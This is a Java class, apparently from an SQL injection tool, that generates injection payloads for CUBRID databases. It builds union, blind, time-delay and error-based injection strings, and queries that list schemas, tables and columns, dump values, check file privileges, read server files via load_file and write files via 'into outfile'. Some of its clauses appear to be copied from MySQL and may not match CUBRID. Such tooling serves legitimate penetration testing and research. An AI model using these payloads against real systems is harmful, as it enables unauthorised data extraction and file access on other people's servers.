package com.jsql.model.vendor;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import com.jsql.model.bean.Database;
import com.jsql.model.bean.Table;
import com.jsql.model.blind.ConcreteTimeInjection;
import com.jsql.model.injection.MediatorModel;
import com.jsql.tool.ToolsString;

public class CubridStrategy implements ISQLStrategy {

    @Override
    public String getSchemaInfos() {
        return 
            "concat(" +
                "" +
                    "concat_ws(" +
                        "'{%}'," +
                        "version()," +
                        "database()," +
                        "user()," +
                        "CURRENT_USER" +
                    ")" +
                "" +
                "," +
                "'%01%03%03%07'" +
            ")";
    }

    @Override
    public String getSchemaList() {
        return 
            "select+" +
                "concat(" +
                    "group_concat(" +
                        "'%04'||" +
                        "r||" +
                        "'%05'||" +
                        "cast(q+as+varchar)||" +
                        "'%04'" +
                        "+order+by+1+" +
                        "separator+'%06'" +
                    ")," +
                    "'%01%03%03%07'" +
                ")" +
            "from(" +
                "select+" +
                    "cast(owner_name+as+varchar)r," +
                    "count(class_name)q+" +
                "from+" +
                    "db_class+" +
                "group+by+r{limit}" +
            ")x";
    }

    @Override
    public String getTableList(Database database) {
        return 
            "select+" +
                "concat(" +
                    "group_concat(" +
                        "'%04'||" +
                        "cast(r+as+varchar)||" +
                        "'%050%04'+" +
                        "order+by+1+" +
                        "separator+'%06'" +
                    ")," +
                    "'%01%03%03%07'" +
                ")" +
            "from(" +
                "select+" +
                    "class_name+r+" +
                "from+" +
                    "db_class+" +
                "where+" +
                    "owner_name='" + database + "'+" +
                "order+by+r{limit}" +
            ")x";
    }

    @Override
    public String getColumnList(Table table) {
        return 
            "select+" +
                "concat(" +
                    "group_concat(" +
                        "'%04'||" +
                        "cast(n+as+varchar)||" +
                        "'%05'||" +
                        "0||" +
                        "'%04'+" +
                        "order+by+1+" +
                        "separator+'%06'" +
                    ")," +
                    "'%01%03%03%07'" +
                ")" +
            "from(" +
                "select+" +
                    "attr_name+n+" +
                "from+" +
                    "db_attribute+c+inner+join+db_class+t+on+t.class_name=c.class_name+" +
                "where+" +
                    "t.owner_name='" + table.getParent() + "'+" +
                    "and+" +
                    "t.class_name='" + table + "'+" +
                "order+by+n{limit}" +
            ")x";
    }

    @Override
    public String getValues(String[] columns, Database database, Table table) {
        String formatListColumn = ToolsString.join(columns, "{%}");
        
        // 7f caract�re d'effacement, dernier code hexa support� par mysql, donne 3f=>? � partir de 80
        formatListColumn = formatListColumn.replace("{%}", "`,'')),'%7f',trim(ifnull(`");
        
        formatListColumn = "trim(ifnull(`" + formatListColumn + "`,''))";
        
        return 
            "select+concat(" +
                "group_concat(" +
                    "'%04'||" +
                    "r||" +
                    "'%05'||" +
                    "cast(q+as+varchar)||" +
                    "'%04'" +
                    "+order+by+1+separator+'%06'" +
                ")," +
                "'%01%03%03%07'" +
            ")from(" +
                "select+" +
                    "cast(concat(" + formatListColumn + ")as+varchar)r," +
                    "count(*)q+" +
                "from+" +
                    "`" + database + "`.`" + table + "`+" +
                "group+by+r{limit}" +
            ")x";
    }

    @Override
    public String getPrivilege() {
        return 
            /**
             * error base mysql remplace '%01%03%03%07' en \x01\x03\x03\x07
             * => forcage en charact�re
             */
            "cast(" +
                "concat(" +
                    "(" +
                        "select+" +
                            "if(count(*)=1,0x" + ToolsString.strhex("true") + ",0x" + ToolsString.strhex("false") + ")" +
                        "from+INFORMATION_SCHEMA.USER_PRIVILEGES+" +
                        "where+" +
                            "grantee=concat(0x27,replace(cast(current_user+as+char),0x40,0x274027),0x27)" +
                            "and+PRIVILEGE_TYPE=0x46494c45" +
                    ")" +
                    "," +
                    "'%01%03%03%07'" +
                ")" +
            "+as+char)";
    }

    @Override
    public String readTextFile(String filePath) {
        return 
            /**
             * error base mysql remplace '%01%03%03%07' en \x01\x03\x03\x07
             * => forcage en charact�re
             */
             "cast(" +
                 "concat(load_file(0x" + ToolsString.strhex(filePath) + "),'%01%03%03%07')" +
             "as+char)";
    }

    @Override
    public String writeTextFile(String content, String filePath) {
        return 
            MediatorModel.model().initialQuery
                .replaceAll(
                    "1337" + MediatorModel.model().visibleIndex + "7331",
                    "(select+0x" + ToolsString.strhex(content) + ")"
                )
                .replaceAll("--++", "")
                + "+into+outfile+\"" + filePath + "\"--+";
    }

    @Override
    public String[] getListFalseTest() {
        return new String[]{"true=false", "true%21=true", "false%21=false", "1=2", "1%21=1", "2%21=2"};
    }

    @Override
    public String[] getListTrueTest() {
        return new String[]{"true=true", "false=false", "true%21=false", "1=1", "2=2", "1%21=2"};
    }

    @Override
    public String getBlindFirstTest() {
        return "0%2b1=1";
    }

    @Override
    public String blindCheck(String check) {
        return "+and+" + check + "--+";
    }

    @Override
    public String blindBitTest(String inj, int indexCharacter, int bit) {
        return "+and+ascii(substring(" + inj + "," + indexCharacter + ",1))%26" + bit + "--+";
    }

    @Override
    public String blindLengthTest(String inj, int indexCharacter) {
        return "+and+char_length(" + inj + ")>" + indexCharacter + "--+";
    }

    @Override
    public String timeCheck(String check) {
        return "+and+if(" + check + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP + "))--+";
    }

    @Override
    public String timeBitTest(String inj, int indexCharacter, int bit) {
        return "+and+if(ascii(substring(" + inj + "," + indexCharacter + ",1))%26" + bit + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP + "))--+";
    }

    @Override
    public String timeLengthTest(String inj, int indexCharacter) {
        return "+and+if(char_length(" + inj + ")>" + indexCharacter + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP + "))--+";
    }

    @Override
    public String blindStrategy(String sqlQuery, String startPosition) {
        return 
            "(" +
                "select+" +
                "concat(" +
                    "'SQLi'," +
                    "substr(" +
                        "(" + sqlQuery + ")," +
                        startPosition + "," +
                        MediatorModel.model().performanceLength +
                    ")" +
                ")" +
            ")";
    }

    @Override
    public String getErrorBasedStrategyCheck() {
        return 
            "+and(" +
                "select+1+" +
                "from(" +
                    "select+" +
                        "count(*)," +
                        "floor(rand(0)*2)" +
                    "from+" +
                        "information_schema.tables+" +
                    "group+by+2" +
                ")a" +
            ")--+";
    }

    @Override
    public String errorBasedStrategy(String sqlQuery, String startPosition) {
        return 
            "+and" +
                "(" +
                "select+" +
                    "1+" +
                "from(" +
                    "select+" +
                        "count(*)," +
                        "concat(" +
                            "'SQLi'," +
                            "replace(" +
                                "substr(" +
                                    "replace(" +
                                        "(" + sqlQuery + ")" +
                                    /**
                                     * message error base remplace le \r en \r\n => pb de comptage
                                     * Fix: remplacement forc� 0x0D => 0x0000
                                     */
                                    ",'%0d','%00%00')," +
                                    startPosition + "," +
                                    /**
                                     * errorbase renvoit 64 caract�res: 'SQLi' en consomme 4
                                     * inutile de renvoyer plus de 64
                                     */
                                    "60" +
                                ")" +
                            /**
                             * r�tablissement 0x0000 => 0x0D
                             */
                            ",'%00%00','%0d')," +
                            "floor(rand(0)*2)" +
                        ")" +
                    "from+information_schema.tables+" +
                    "group+by+2" +
                ")a" +
            ")--+";
    }

    @Override
    public String normalStrategy(String sqlQuery, String startPosition) {
        return 
        "(" +
            "select+" +
                /**
                 * If reach end of string (concat(SQLi+NULL)) then concat nullifies the result
                 */
                "concat(" +
                    "'SQLi'," +
                    "substr(" +
                        "(" + sqlQuery + ")," +
                        startPosition + "," +
                        /**
                         * Minus 'SQLi' should apply
                         */
                        MediatorModel.model().performanceLength +
                    ")" +
                ")" +
        ")";
    }

    @Override
    public String timeStrategy(String sqlQuery, String startPosition) {
        return 
            "(" +
                "select+" +
                    "concat(" +
                        "'SQLi'," +
                        "substr(" +
                            "(" + sqlQuery + ")," +
                            startPosition + "," +
                            "65536" +
                        ")" +
                    ")" +
            ")";
    }

    @Override
    public String performanceQuery(String[] indexes) {
        return 
            MediatorModel.model().initialQuery.replaceAll(
                "1337(" + ToolsString.join(indexes, "|") + ")7331",
                "(select+concat('SQLi',$1,repeat('%23',65536),'%01%03%03%07iLQS'))"
            );
    }

    @Override
    public String initialQuery(Integer nbFields) {
        List<String> fields = new ArrayList<String>(); 
        for (int i = 1 ; i <= nbFields ; i++) {
            fields.add("''||1337"+ i +"7330%2b1");
        }
        return "+union+select+" + ToolsString.join(fields.toArray(new String[fields.size()]), ",") + "--+";
    }

    @Override
    public String insertionCharacterQuery() {
        return "+order+by+1337--+";
    }

    @Override
    public String getLimit(Integer limitSQLResult) {
        return "+limit+" + limitSQLResult + ",65536";
    }

    @Override
    public String getDbLabel() {
        return "CUBRID";
    }
}